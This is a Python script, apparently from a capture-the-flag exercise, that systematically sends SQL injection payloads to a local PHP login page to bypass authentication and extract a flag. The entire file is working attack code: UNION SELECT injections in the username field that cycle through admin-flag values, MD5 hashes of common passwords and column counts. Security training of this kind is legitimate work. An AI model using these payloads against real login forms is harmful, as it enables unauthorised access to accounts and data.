import requests
import re

target = "http://127.0.0.1:32895/index.php"

print("FINAL SYSTEMATIC TEST - Exhaustive column/value combinations\n")

# Maybe is_admin needs to be a specific string value
print("[Testing different is_admin values in 3rd column]")
is_admin_values = ['1', '1.0', 'true', 'TRUE', 'yes', 'YES', 'y', 'Y', "'1'", "'true'", "'yes'", "'admin'"]

for val in is_admin_values:
    payload = f"' UNION SELECT 'admin','password',{val}-- -"
    params = {'username': payload, 'password': 'x'}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"\n[!!! FLAG FOUND with is_admin={val} !!!]")
        print(f"Flag: {flag_match.group(0)}")
        print(resp.text)
        exit(0)
    
    print(f"[✗] is_admin={val:15s}")

# Maybe it needs specific values in ALL columns
print("\n[Testing with realistic user data]")
realistic_combos = [
    "'admin','5f4dcc3b5aa765d61d8327deb882cf99',1",  # admin:password (MD5)
    "'admin','21232f297a57a5a743894a0e4a801fc3',1",  # admin:admin (MD5)
    "'admin','admin',1",
    "'admin','',1",
    "'Administrator','',1",
]

for combo in realistic_combos:
    payload = f"' UNION SELECT {combo}-- -"
    params = {'username': payload, 'password': 'x'}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"\n[!!! FLAG FOUND !!!]")
        print(f"Combo: {combo}")
        print(f"Flag: {flag_match.group(0)}")
        print(resp.text)
        exit(0)
    
    print(f"[✗] {combo}")

# Maybe ORDER BY was lying and there are only 2 columns?
print("\n[Testing with 2 columns]")
two_col_payloads = [
    "'admin',1",
    "1,'admin'",
    "'admin','admin'",
]

for combo in two_col_payloads:
    payload = f"' UNION SELECT {combo}-- -"
    params = {'username': payload, 'password': 'x'}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"\n[!!! FLAG FOUND with 2 cols !!!]")
        print(f"Combo: {combo}")
        print(f"Flag: {flag_match.group(0)}")
        print(resp.text)
        exit(0)
    
    print(f"[✗] 2 cols: {combo}")

# Check if maybe we need to provide the password too
print("\n[Testing with password parameter matching injection]")
matching_tests = [
    ("' UNION SELECT 'admin','test123',1-- -", "test123"),
    ("' UNION SELECT 'admin','mypass',1-- -", "mypass"),
]

for user_payload, pwd in matching_tests:
    params = {'username': user_payload, 'password': pwd}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"\n[!!! FLAG FOUND with matching password !!!]")
        print(f"Flag: {flag_match.group(0)}")
        print(resp.text)
        exit(0)
    
    print(f"[✗] Matched password: {pwd}")

print("\n[COMPLETE] All systematic tests exhausted without finding flag")

